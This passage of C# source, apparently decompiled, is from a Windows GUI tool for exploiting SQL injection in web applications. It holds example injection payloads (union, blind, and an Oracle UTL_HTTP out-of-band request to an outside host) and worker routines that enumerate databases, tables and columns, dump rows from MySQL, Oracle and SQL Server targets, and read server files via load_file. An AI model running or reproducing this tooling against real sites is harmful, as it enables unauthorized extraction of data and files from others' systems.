            this.lblComment.Text = "Comments String:";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(145, 213);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(491, 12);
            this.label4.TabIndex = 19;
            this.label4.Text = "\'http://sec4app.com/test/info.php?id=\'||(select instance_name from v$instance))--" +
    "";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(145, 194);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(395, 12);
            this.label1.TabIndex = 18;
            this.label1.Text = "Example: http://127.0.0.1/topic.jsp?id=1 and 1=(UTL_HTTP.request(";
            // 
            // radioCrossSite
            // 
            this.radioCrossSite.AutoSize = true;
            this.radioCrossSite.Location = new System.Drawing.Point(10, 192);
            this.radioCrossSite.Name = "radioCrossSite";
            this.radioCrossSite.Size = new System.Drawing.Size(77, 16);
            this.radioCrossSite.TabIndex = 17;
            this.radioCrossSite.TabStop = true;
            this.radioCrossSite.Text = "CrossSite";
            this.radioCrossSite.UseVisualStyleBackColor = true;
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.Location = new System.Drawing.Point(287, 101);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(65, 12);
            this.label15.TabIndex = 16;
            this.label15.Text = "Example: 4";
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Location = new System.Drawing.Point(287, 71);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(65, 12);
            this.label14.TabIndex = 15;
            this.label14.Text = "Example: 3";
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Location = new System.Drawing.Point(145, 158);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(467, 12);
            this.label13.TabIndex = 14;
            this.label13.Text = "Example: http://127.0.0.1/topic.asp?id=10 and ascii(substr(@@version,1,1))<97";
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Location = new System.Drawing.Point(145, 49);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(497, 12);
            this.label12.TabIndex = 13;
            this.label12.Text = "Example: http://127.0.0.1/topic.asp?id=10 and 1=2 union all select 1,1,@@version," +
    "1";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Location = new System.Drawing.Point(145, 27);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(347, 12);
            this.label11.TabIndex = 12;
            this.label11.Text = "Example: http://127.0.0.1/topic.asp?id=10 and 1=@@version";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(287, 129);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(305, 12);
            this.label10.TabIndex = 11;
            this.label10.Text = "Example: 1  (One of: 1/NULL/char(97)/chr(97) etc.)";
            // 
            // txtWildField
            // 
            this.txtWildField.Location = new System.Drawing.Point(185, 126);
            this.txtWildField.Name = "txtWildField";
            this.txtWildField.Size = new System.Drawing.Size(90, 21);
            this.txtWildField.TabIndex = 10;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(43, 129);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(137, 12);
            this.label9.TabIndex = 9;
            this.label9.Text = "Other Field Filled By:";
            // 
            // btnSetEnv
            // 
            this.btnSetEnv.Enabled = false;
            this.btnSetEnv.Location = new System.Drawing.Point(185, 314);
            this.btnSetEnv.Name = "btnSetEnv";
            this.btnSetEnv.Size = new System.Drawing.Size(107, 23);
            this.btnSetEnv.TabIndex = 8;
            this.btnSetEnv.Text = "SetCurrentValue";
            this.btnSetEnv.UseVisualStyleBackColor = true;
            this.btnSetEnv.Click += new System.EventHandler(this.btnSetEnv_Click);
            // 
            // btnGetEnv
            // 
            this.btnGetEnv.Location = new System.Drawing.Point(22, 314);
            this.btnGetEnv.Name = "btnGetEnv";
            this.btnGetEnv.Size = new System.Drawing.Size(110, 23);
            this.btnGetEnv.TabIndex = 7;
            this.btnGetEnv.Text = "GetCurrentValue";
            this.btnGetEnv.UseVisualStyleBackColor = true;
            this.btnGetEnv.Click += new System.EventHandler(this.btnGetEnv_Click);
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(43, 71);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(131, 12);
            this.label8.TabIndex = 6;
            this.label8.Text = "Inject In Field(1-N):";
            // 
            // txtInjectField
            // 
            this.txtInjectField.Location = new System.Drawing.Point(185, 68);
            this.txtInjectField.Name = "txtInjectField";
            this.txtInjectField.Size = new System.Drawing.Size(90, 21);
            this.txtInjectField.TabIndex = 5;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(43, 101);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(125, 12);
            this.label7.TabIndex = 4;
            this.label7.Text = "Field Number In SQL:";
            // 
            // txtFieldNum
            // 
            this.txtFieldNum.Location = new System.Drawing.Point(185, 98);
            this.txtFieldNum.Name = "txtFieldNum";
            this.txtFieldNum.Size = new System.Drawing.Size(90, 21);
            this.txtFieldNum.TabIndex = 3;
            // 
            // radioBlind
            // 
            this.radioBlind.AutoSize = true;
            this.radioBlind.Location = new System.Drawing.Point(10, 156);
            this.radioBlind.Name = "radioBlind";
            this.radioBlind.Size = new System.Drawing.Size(53, 16);
            this.radioBlind.TabIndex = 2;
            this.radioBlind.TabStop = true;
            this.radioBlind.Text = "Blind";
            this.radioBlind.UseVisualStyleBackColor = true;
            // 
            // radioFieldEcho
            // 
            this.radioFieldEcho.AutoSize = true;
            this.radioFieldEcho.Location = new System.Drawing.Point(10, 47);
            this.radioFieldEcho.Name = "radioFieldEcho";
            this.radioFieldEcho.Size = new System.Drawing.Size(53, 16);
            this.radioFieldEcho.TabIndex = 1;
            this.radioFieldEcho.TabStop = true;
            this.radioFieldEcho.Text = "Union";
            this.radioFieldEcho.UseVisualStyleBackColor = true;
            // 
            // radioPlainText
            // 
            this.radioPlainText.AutoSize = true;
            this.radioPlainText.Location = new System.Drawing.Point(10, 25);
            this.radioPlainText.Name = "radioPlainText";
            this.radioPlainText.Size = new System.Drawing.Size(77, 16);
            this.radioPlainText.TabIndex = 0;
            this.radioPlainText.TabStop = true;
            this.radioPlainText.Text = "PlainText";
            this.radioPlainText.UseVisualStyleBackColor = true;
            // 
            // toolStripSQL
            // 
            this.toolStripSQL.BackColor = System.Drawing.SystemColors.ButtonFace;
            this.toolStripSQL.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
            this.toolStripSQL.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripLabel1,
            this.cmbDBTypeList,
            this.toolStripSeparator1,
            this.toolStripLabel2,
            this.txtKeyWord,
            this.toolStripSeparator2,
            this.toolStripLabel3,
            this.cmbInjectionType,
            this.toolStripSeparator3,
            this.ButtonResetSQL,
            this.toolStripSeparator20});
            this.toolStripSQL.Location = new System.Drawing.Point(0, 0);
            this.toolStripSQL.Name = "toolStripSQL";
            this.toolStripSQL.Size = new System.Drawing.Size(685, 25);
            this.toolStripSQL.TabIndex = 1;
            this.toolStripSQL.Text = "SQL Injection";
            // 
            // toolStripLabel1
            // 
            this.toolStripLabel1.Name = "toolStripLabel1";
            this.toolStripLabel1.Size = new System.Drawing.Size(66, 22);
            this.toolStripLabel1.Text = "DataBase:";
            // 
            // cmbDBTypeList
            // 
            this.cmbDBTypeList.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cmbDBTypeList.Items.AddRange(new object[] {
            "UnKnown",
            "SQLServer",
            "MySQL",
            "Oracle",
            "DB2",
            "Access",
            "Other"});
            this.cmbDBTypeList.Name = "cmbDBTypeList";
            this.cmbDBTypeList.Size = new System.Drawing.Size(80, 25);
            this.cmbDBTypeList.DropDownClosed += new System.EventHandler(this.cmbDBTypeList_DropDownClosed);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(6, 25);
            // 
            // toolStripLabel2
            // 
            this.toolStripLabel2.Name = "toolStripLabel2";
            this.toolStripLabel2.Size = new System.Drawing.Size(65, 22);
            this.toolStripLabel2.Text = "KeyWord:";
            // 
            // txtKeyWord
            // 
            this.txtKeyWord.Name = "txtKeyWord";
            this.txtKeyWord.Size = new System.Drawing.Size(150, 25);
            // 
            // toolStripSeparator2
            // 
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new System.Drawing.Size(6, 25);
            // 
            // toolStripLabel3
            // 
            this.toolStripLabel3.Name = "toolStripLabel3";
            this.toolStripLabel3.Size = new System.Drawing.Size(92, 22);
            this.toolStripLabel3.Text = "Injection Type:";
            // 
            // cmbInjectionType
            // 
            this.cmbInjectionType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cmbInjectionType.Items.AddRange(new object[] {
            "UnKnown",
            "Integer",
            "String",
            "Search"});
            this.cmbInjectionType.Name = "cmbInjectionType";
            this.cmbInjectionType.Size = new System.Drawing.Size(80, 25);
            this.cmbInjectionType.DropDownClosed += new System.EventHandler(this.cmbInjectionType_DropDownClosed);
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(6, 25);
            // 
            // ButtonResetSQL
            // 
            this.ButtonResetSQL.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.ButtonResetSQL.Image = ((System.Drawing.Image)(resources.GetObject("ButtonResetSQL.Image")));
            this.ButtonResetSQL.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.ButtonResetSQL.Name = "ButtonResetSQL";
            this.ButtonResetSQL.Size = new System.Drawing.Size(44, 22);
            this.ButtonResetSQL.Text = "Reset";
            this.ButtonResetSQL.Click += new System.EventHandler(this.ButtonResetSQL_Click);
            // 
            // toolStripSeparator20
            // 
            this.toolStripSeparator20.Name = "toolStripSeparator20";
            this.toolStripSeparator20.Size = new System.Drawing.Size(6, 25);
            // 
            // FormSQL
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(685, 416);
            this.Controls.Add(this.tabSQLInjection);
            this.Controls.Add(this.toolStripSQL);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "FormSQL";
            this.Text = "FormSQL";
            this.tabSQLInjection.ResumeLayout(false);
            this.tabEnv.ResumeLayout(false);
            this.tabEnv.PerformLayout();
            this.toolStripEnv.ResumeLayout(false);
            this.toolStripEnv.PerformLayout();
            this.tabDatabase.ResumeLayout(false);
            this.splitDB.Panel1.ResumeLayout(false);
            this.splitDB.Panel1.PerformLayout();
            this.splitDB.Panel2.ResumeLayout(false);
            this.splitDB.Panel2.PerformLayout();
            this.splitDB.ResumeLayout(false);
            this.toolStripDB.ResumeLayout(false);
            this.toolStripDB.PerformLayout();
            this.toolStripData.ResumeLayout(false);
            this.toolStripData.PerformLayout();
            this.tabCMD.ResumeLayout(false);
            this.tabCMD.PerformLayout();
            this.toolStripDBCMD.ResumeLayout(false);
            this.toolStripDBCMD.PerformLayout();
            this.toolStripCommand.ResumeLayout(false);
            this.toolStripCommand.PerformLayout();
            this.tabFileReader.ResumeLayout(false);
            this.tabFileReader.PerformLayout();
            this.toolFileReader.ResumeLayout(false);
            this.toolFileReader.PerformLayout();
            this.tabFileUploader.ResumeLayout(false);
            this.tabFileUploader.PerformLayout();
            this.tabEscapeString.ResumeLayout(false);
            this.tabEscapeString.PerformLayout();
            this.tabDebug.ResumeLayout(false);
            this.grpBlindType.ResumeLayout(false);
            this.grpBlindType.PerformLayout();
            this.toolStripSQL.ResumeLayout(false);
            this.toolStripSQL.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private void InitURL()
        {
            if (this.mainfrm.ReqType == RequestType.GET)
            {
                this.URL = this.mainfrm.URL;
            }
            else
            {
                this.URL = this.mainfrm.URL + "^" + this.mainfrm.SubmitData;
            }
        }

        private void ItemClick(object sender, EventArgs e)
        {
            try
            {
                TreeNode node = new TreeNode();
                string text = ((ToolStripMenuItem) sender).Text;
                if (text != null)
                {
                    if (!(text == "New Node"))
                    {
                        if (text == "New Sub Node")
                        {
                            goto Label_011C;
                        }
                        if (text == "Edit Node")
                        {
                            goto Label_014D;
                        }
                        if (text == "Remove Node")
                        {
                            goto Label_015F;
                        }
                        if (text == "Show SubNodes Count")
                        {
                            goto Label_0186;
                        }
                    }
                    else
                    {
                        if (this.treeViewDB.Nodes.Count == 0)
                        {
                            this.treeViewDB.Nodes.Add("Node0001").BeginEdit();
                        }
                        else
                        {
                            if (this.treeViewDB.SelectedNode == null)
                            {
                                return;
                            }
                            if (this.treeViewDB.SelectedNode.Level == 0)
                            {
                                this.treeViewDB.SelectedNode.TreeView.Nodes.Add("Node0001").BeginEdit();
                            }
                            else
                            {
                                this.treeViewDB.SelectedNode.Parent.Nodes.Add("Node0001").BeginEdit();
                            }
                        }
                        this.treeViewDB.ExpandAll();
                    }
                }
                return;
            Label_011C:
                node = this.treeViewDB.SelectedNode.Nodes.Add("Node0001");
                this.treeViewDB.ExpandAll();
                node.BeginEdit();
                return;
            Label_014D:
                this.treeViewDB.SelectedNode.BeginEdit();
                return;
            Label_015F:
                if (MessageBox.Show("Are you sure to delete the selected node?", "Confirm", MessageBoxButtons.OKCancel, MessageBoxIcon.Question) == DialogResult.OK)
                {
                    this.treeViewDB.SelectedNode.Remove();
                }
                return;
            Label_0186:
                MessageBox.Show("SubNodes Count of " + this.treeViewDB.SelectedNode.Text + ": " + this.treeViewDB.SelectedNode.Nodes.Count.ToString(), "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch
            {
            }
        }

        private void listViewData_MouseClick(object sender, MouseEventArgs e)
        {
            if (this.listViewData.SelectedItems.Count >= 1)
            {
                ContextMenuStrip strip = new ContextMenuStrip();
                strip.Items.Add("Copy Data Row To ClipBoard", null, new EventHandler(this.DataItemClick));
                this.listViewData.ContextMenuStrip = strip;
            }
        }

        private void listViewEnv_MouseClick(object sender, MouseEventArgs e)
        {
            if ((this.listViewEnv.SelectedItems.Count >= 1) && (this.listViewEnv.SelectedItems[0].SubItems.Count > 1))
            {
                ContextMenuStrip strip = new ContextMenuStrip();
                strip.Items.Add("Copy Value To ClipBoard", null, new EventHandler(this.ListViewInfoItemClick));
                this.listViewEnv.ContextMenuStrip = strip;
            }
        }

        private void ListViewInfoItemClick(object sender, EventArgs e)
        {
            try
            {
                string str;
                if (((str = ((ToolStripMenuItem) sender).Text) != null) && (str == "Copy Value To ClipBoard"))
                {
                    Clipboard.SetText(this.listViewEnv.SelectedItems[0].SubItems[1].Text);
                }
            }
            catch
            {
            }
        }

        private bool ListViewInfoItemIsChecked(int Index)
        {
            if (!this.listViewEnv.InvokeRequired)
            {
                return this.listViewEnv.Items[Index].Checked;
            }
            dd2 method = new dd2(this.ListViewInfoItemIsChecked);
            return (bool) base.Invoke(method, new object[] { Index });
        }

        public void LoadFromXmlDocument(XmlDocument WcrXml)
        {
            try
            {
                string str = WcrXml.SelectSingleNode("//ROOT/CurrentSite/DatabaseType").Attributes["Value"].Value;
                this.mainfrm.CurrentSite.DatabaseType = (DBType) System.Enum.Parse(typeof(DBType), str);
                this.InitByDBType(true);
                this.UpdateComboDBType(str);
                string itemText = WcrXml.SelectSingleNode("//ROOT/CurrentSite/CurrentKeyWord").Attributes["Value"].Value;
                this.mainfrm.CurrentSite.CurrentKeyWord = itemText;
                this.UpdateKeyWordText(itemText);
                try
                {
                    string str3 = WcrXml.SelectSingleNode("//ROOT/CurrentSite/CurrentInjType").Attributes["Value"].Value;
                    this.mainfrm.CurrentSite.InjType = (InjectionType) System.Enum.Parse(typeof(InjectionType), str3);
                }
                catch
                {
                }
                try
                {
                    XmlNode node = WcrXml.SelectSingleNode("//ROOT/CurrentSite/CurrentBlindInjType");
                    string str4 = node.Attributes["Value"].Value;
                    this.mainfrm.CurrentSite.BlindInjType = (BlindType) System.Enum.Parse(typeof(BlindType), str4);
                    this.mainfrm.CurrentSite.CurrentFieldEchoIndex = int.Parse(node.Attributes["CurrentFieldEchoIndex"].Value);
                    this.mainfrm.CurrentSite.CurrentFieldNum = int.Parse(node.Attributes["CurrentFieldNum"].Value);
                }
                catch
                {
                }
                this.treeViewDB.Nodes.Clear();
                string text = "";
                string str6 = "";
                string str7 = "";
                XmlNodeList list = WcrXml.SelectNodes("//ROOT/SiteDBStructure/Database");
                TreeNode node2 = new TreeNode();
                TreeNode node3 = new TreeNode();
                TreeNode node4 = new TreeNode();
                foreach (XmlNode node5 in list)
                {
                    text = node5.Attributes["Text"].Value;
                    node2 = this.treeViewDB.Nodes.Add(text);
                    node2.ImageKey = "db.png";
                    foreach (XmlNode node6 in node5.ChildNodes)
                    {
                        str6 = node6.Attributes["Text"].Value;
                        node3 = node2.Nodes.Add(str6);
                        node3.ImageKey = "table.png";
                        foreach (XmlNode node7 in node6.ChildNodes)
                        {
                            str7 = node7.Attributes["Text"].Value;
                            node3.Nodes.Add(str7).ImageKey = "column.png";
                        }
                    }
                }
                this.treeViewDB.ExpandAll();
                XmlNodeList list2 = WcrXml.SelectNodes("//ROOT/SiteSQLEnv/EnvRow");
                this.listViewEnv.Items.Clear();
                foreach (XmlNode node8 in list2)
                {
                    ListViewItem item = new ListViewItem(node8.ChildNodes[0].InnerText);
                    item.SubItems.Add(node8.ChildNodes[1].InnerText);
                    this.listViewEnv.Items.Add(item);
                }
                this.URL = WcrXml.SelectSingleNode("//ROOT/CurrentSite/URL").Attributes["Value"].Value;
                this.InitByInjectionType(this.mainfrm.CurrentSite.InjType, this.URL);
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message);
            }
        }

        private void MySQLGetColumnDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string str2 = strArray[0];
                string str3 = strArray[1];
                string str4 = strArray[2];
                string itemName = strArray[3];
                string str6 = strArray[4];
                string str7 = this.GetItemByMySQL("select ", "COLUMN_NAME", "from information_schema.COLUMNS where TABLE_SCHEMA=" + this.EscapeSingleQuotes(itemName) + "%20and TABLE_NAME=" + this.EscapeSingleQuotes(str6) + "%20limit " + str4.ToString() + ",1", 0xff, 0x20);
                this.AddColumn2TreeView(str2 + "^" + str3 + "^" + str7);
            }
            catch
            {
            }
        }

        private void MySQLGetDataDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string itemName = strArray[0];
                string str2 = strArray[1];
                string str3 = strArray[2];
                string str4 = strArray[3];
                string itemText = this.GetItemByMySQL("select", itemName, " from " + str2 + "." + str3 + " limit " + str4 + ",1", 0xff, 0x400);
                this.AddItem2ListViewData(itemText);
            }
            catch
            {
            }
        }

        private void MySQLGetDBDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                int num = (int) data;
                WebSite.LogScannedData("Getting DB id: " + num.ToString());
                string nodeText = this.GetItemByMySQL("select", "SCHEMA_NAME", " from information_schema.SCHEMATA limit " + num.ToString() + ",1", 0xff, 0x20);
                this.AddDB2TreeView(nodeText);
            }
            catch
            {
            }
        }

        private void MySQLGetTableDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string str2 = strArray[1];
                string itemName = strArray[2];
                this.AddTable2TreeView(strArray[0] + "^" + this.GetItemByMySQL("select", "TABLE_NAME", " from information_schema.tables where TABLE_SCHEMA=" + this.EscapeSingleQuotes(itemName) + "%20limit " + str2 + ",1", 0xff, 0x20));
            }
            catch
            {
            }
        }

        private void MySQLReadFile(object Filename)
        {
            string itemName = (string) Filename;
            string text = this.GetItemByMySQL("select", "load_file(" + this.EscapeSingleQuotes(itemName) + ")", "", 0xff, 0xff);
            this.UpdateTextBoxText(this.txtFileContent, text);
        }

        private void OracleGetColumnDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string str2 = strArray[0];
                string str3 = strArray[1];
                string str4 = strArray[2];
                string itemName = strArray[3];
                string str6 = this.GetItemByOracle("select ", "COLUMN_NAME", "from (select ROWNUM,COLUMN_NAME FROM user_tab_columns WHERE table_name=" + this.EscapeSingleQuotes(itemName) + " and rownum<=" + str4 + " order by ROWNUM desc) where rownum<=1", 0xff, 0x80);
                this.AddColumn2TreeView(str2 + "^" + str3 + "^" + str6);
            }
            catch
            {
            }
        }

        private void OracleGetDataDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { ':' });
                string itemName = strArray[0];
                string str2 = strArray[1];
                string str3 = strArray[2];
                int num = int.Parse(strArray[3]);
                string[] strArray2 = new string[] { "from (select  ", str2, " from ", str3, " where rownum<=", (num + 1).ToString(), " order by rownum desc) where rownum<=1" };
                string itemText = this.GetItemByOracle("select", itemName, string.Concat(strArray2), 0xff, 0x400);
                this.AddItem2ListViewData(itemText);
            }
            catch
            {
            }
        }

        private void OracleGetTableDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                this.AddTable2TreeView(strArray[0] + "^" + this.GetItemByOracle("select", "TABLE_NAME", " from (select ROWNUM,table_name from user_tables where rownum<=" + strArray[1] + " order by ROWNUM desc) where rownum<=1", 0xff, 0x80));
            }
            catch
            {
            }
        }

        private string ReadListViewInfoItems(int Index)
        {
            if (!this.listViewEnv.InvokeRequired)
            {
                return this.listViewEnv.Items[Index].Text;
            }
            dd3 method = new dd3(this.ReadListViewInfoItems);
            return (string) base.Invoke(method, new object[] { Index });
        }

        private void RemoveTabPagesByName(TabPage TabName)
        {
            if (!this.tabSQLInjection.InvokeRequired)
            {
                if (this.tabSQLInjection.TabPages.Contains(TabName))
                {
                    this.tabSQLInjection.TabPages.Remove(TabName);
                }
            }
            else
            {
                RemoveTab method = new RemoveTab(this.RemoveTabPagesByName);
                base.Invoke(method, new object[] { TabName });
            }
        }

        public void SelectTabByName(string TabName)
        {
            this.tabSQLInjection.SelectTab(TabName);
        }

        private void SetTextBoxText(TxtBoxInfo txtBoxInfo)
        {
            try
            {
                if (!txtBoxInfo.txtBox.InvokeRequired)
                {
                    txtBoxInfo.txtBox.Text = txtBoxInfo.Text;
                }
                else
                {
                    ddSetTextBox method = new ddSetTextBox(this.SetTextBoxText);
                    base.Invoke(method, new object[] { txtBoxInfo });
                }
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message);
            }
        }

        private void SQLServerGetDataDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string itemName = strArray[0];
                int num = int.Parse(strArray[1]);
                string str2 = strArray[2];
                string str3 = strArray[3];
                string str4 = strArray[4];
                string[] strArray2 = new string[] { "from (select top ", (num + 1).ToString(), " ", str2, " from ", str3, " order by ", str4, ") T order by ", str4, " desc" };
                string itemText = this.GetItemBySQLServer("select%20top%201%20", itemName, string.Concat(strArray2), 0xff, 0x400, true);
                this.AddItem2ListViewData(itemText);
            }
            catch
            {
            }
        }

        private void treeViewDB_AfterCheck(object sender, TreeViewEventArgs e)
        {
            if (e.Action == TreeViewAction.ByMouse)
            {
                int level = e.Node.Level;
                switch (level)
                {
                    case 0:
                        this.btnGetTable.Enabled = true;
                        break;

                    case 1:
                        this.btnGetColumn.Enabled = true;
                        break;
                }
                if (level == 2)
                {
                    this.listViewData.Items.Clear();
                    this.listViewData.Columns.Clear();
                    foreach (TreeNode node in e.Node.Parent.Nodes)
                    {
                        if (node.Checked)
                        {
                            this.listViewData.Columns.Add(node.Text);
                        }
                    }
                    this.btnGetData.Enabled = true;
                }
            }
        }

        private void treeViewDB_BeforeCheck(object sender, TreeViewCancelEventArgs e)
        {
            if (e.Action == TreeViewAction.ByMouse)
            {
                switch (e.Node.Level)
                {
                    case 0:
                        foreach (TreeNode node in e.Node.TreeView.Nodes)
                        {
                            node.Checked = false;
                            if (node.Nodes.Count > 0)
                            {
                                foreach (TreeNode node2 in node.Nodes)
                                {
                                    node2.Checked = false;
                                }
                            }
                        }
                        break;

                    case 1:
                        foreach (TreeNode node3 in e.Node.Parent.TreeView.Nodes)
                        {
                            node3.Checked = false;
                        }
                        foreach (TreeNode node4 in e.Node.Parent.Nodes)
                        {
                            node4.Checked = false;
                        }
                        e.Node.Parent.Checked = true;
                        break;

                    case 2:
                        foreach (TreeNode node5 in e.Node.Parent.Parent.TreeView.Nodes)
                        {
                            node5.Checked = false;
                        }
                        foreach (TreeNode node6 in e.Node.Parent.Parent.Nodes)
                        {
                            node6.Checked = false;
                        }
                        e.Node.Parent.Checked = true;
                        e.Node.Parent.Parent.Checked = true;
                        break;
                }
            }
        }

        private void treeViewDB_MouseDown(object sender, MouseEventArgs e)
        {
            if (this.treeViewDB.Nodes.Count == 0)
            {
                ContextMenuStrip strip = new ContextMenuStrip();
                strip.Items.Add("New Node", null, new EventHandler(this.ItemClick));
                this.treeViewDB.ContextMenuStrip = strip;
            }
        }

        private void treeViewDB_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            Point pt = new Point(e.X, e.Y);
            TreeNode nodeAt = this.treeViewDB.GetNodeAt(pt);
            this.treeViewDB.SelectedNode = nodeAt;
            ContextMenuStrip strip = new ContextMenuStrip();
            strip.Items.Add("New Node", null, new EventHandler(this.ItemClick));
            if (nodeAt != null)
            {
                if (nodeAt.Level < 2)
                {
                    strip.Items.Add("New Sub Node", null, new EventHandler(this.ItemClick));
                }
                strip.Items.Add("Edit Node", null, new EventHandler(this.ItemClick));
                strip.Items.Add("Remove Node", null, new EventHandler(this.ItemClick));
                strip.Items.Add("Show SubNodes Count", null, new EventHandler(this.ItemClick));
            }
            this.treeViewDB.ContextMenuStrip = strip;
        }

        private bool TreeViewDBChecked(string TreeInfo)
        {
            if (!this.treeViewDB.InvokeRequired)
            {
                string[] strArray = TreeInfo.Split(new char[] { '^' });
                switch (strArray.Length)
                {
                    case 1:
                    {
                        int num2 = int.Parse(strArray[0]);
                        return this.treeViewDB.Nodes[num2].Checked;
                    }
                    case 2:
                    {
                        int num3 = int.Parse(strArray[0]);
                        int num4 = int.Parse(strArray[1]);
                        return this.treeViewDB.Nodes[num3].Nodes[num4].Checked;
                    }
                    case 3:
                    {
                        int num5 = int.Parse(strArray[0]);
                        int num6 = int.Parse(strArray[1]);
                        int num7 = int.Parse(strArray[2]);
                        return this.treeViewDB.Nodes[num5].Nodes[num6].Nodes[num7].Checked;
                    }
                }
                return false;
            }
            TreeChecked method = new TreeChecked(this.TreeViewDBChecked);
            return (bool) base.Invoke(method, new object[] { TreeInfo });
        }

        public int UnicodeInt2UTF8Int(int UnicodeInt)
        {
            if (UnicodeInt < 0x80)
            {
                return UnicodeInt;
            }
            int num = (UnicodeInt >> 12) & 15;
            int num2 = (UnicodeInt >> 6) & 0x3f;
            int num3 = UnicodeInt & 0x3f;
            return ((((num + 0xe0) << 0x10) + ((num2 + 0x80) << 8)) + (num3 + 0x80));
        }

        private void UpdateComboDBType(string DBString)
        {
            if (!this.toolStripSQL.InvokeRequired)
            {
                this.cmbDBTypeList.SelectedIndex = this.cmbDBTypeList.FindString(DBString);
            }
            else
            {
                dd method = new dd(this.UpdateComboDBType);
                base.Invoke(method, new object[] { DBString });
            }
        }

        private void UpdateComboInjType(string InjString)
        {
            if (!this.toolStripSQL.InvokeRequired)
            {
                this.cmbInjectionType.SelectedIndex = this.cmbInjectionType.FindString(InjString);
            }
            else
            {
                dd method = new dd(this.UpdateComboInjType);
                base.Invoke(method, new object[] { InjString });
            }
        }

        public void UpdateKeyWordText(string ItemText)
        {
            if (!this.toolStripSQL.InvokeRequired)
            {
                this.txtKeyWord.Text = ItemText;
                this.toolStripSQL.Refresh();
            }
            else
            {
                dd method = new dd(this.UpdateKeyWordText);
                base.Invoke(method, new object[] { ItemText });
            }
        }

        private void UpdateTextBoxText(TextBox txtBox, string Text)
        {
            TxtBoxInfo info;
            info.txtBox = txtBox;
            info.Text = Text;
            this.SetTextBoxText(info);
        }

        public int UTF8Int2UnicodeInt(int UTF8Int)
        {
            if (UTF8Int < 0x80)
            {
                return UTF8Int;
            }
            int num = (UTF8Int >> 0x10) & 15;
            int num2 = (UTF8Int >> 8) & 0x3f;
            int num3 = UTF8Int & 0x3f;
            return (((num << 12) + (num2 << 6)) + num3);
        }

        private delegate void AddTab(TabPage TabName);

        private delegate void ClearDD(ListView lv);

        private delegate void dd(string s);

        private delegate bool dd2(int i);

        private delegate string dd3(int i);

        private delegate int ddGetListViewCount(ListView lv);

        private delegate string DDReadTree(string TreeInfo);

        private delegate void ddSetTextBox(FormSQL.TxtBoxInfo txtBoxInfo);

        private delegate string ds();

